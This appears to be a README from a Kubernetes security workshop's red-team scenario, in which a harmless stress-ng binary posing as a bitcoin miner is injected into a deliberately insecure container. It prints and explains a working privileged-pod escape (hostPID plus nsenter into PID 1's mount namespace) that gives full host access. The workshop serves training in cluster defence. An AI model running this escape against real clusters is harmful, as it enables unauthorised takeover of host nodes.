# Bitcoint injector

For Scenario 3, the Red team will modify the running container to inject their bitcoinero binary into the existing container.

This directory has the files to support this:

* moneymomeymoney - This is the "bitcoin miner" which is actually stress-ng
* run-bitcoin-injector.sh - This is the script which is run inside the insecure-app container to kick-off the process.  
* inject-image.sh - Performs the image pull, modification and push

## Black magic behind the script

Using a [neat trick from Twitter](https://x.com/mauilion/status/1129468485480751104), let's attempt to deploy a container that gives us full host access:

```
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special.

First we see "hostPID": true, which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host.

Next, we use the nsenter command to switch to a different mount namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host mount namespace! The result is similar to doing a HostPath mount and chroot-ing into it, but this works at a lower level, breaking down the mount namespace isolation completely. The privileged security context is necessary to prevent a permissions error accessing /proc/1/ns/mnt.

## Testing of this script

To test this, there was a lot of back and forth testing.  Here are some frequest commands I ran
```
az acr repository delete -n $ACR_NAME --image insecure-app:latest -y
az acr import -n $ACR_NAME --source docker.io/lastcoolnameleft/insecure-app:latest --image insecure-app:latest
kubectl delete deployment insecure-app
kubectl apply -k ./workshop/manifests
scp workshop/bitcoin-injector/inject-image.sh lcnl:lastcoolnameleft.com/mini
scp workshop/bitcoin-injector/run-bitcoin-injector.sh lcnl:lastcoolnameleft.com/mini
```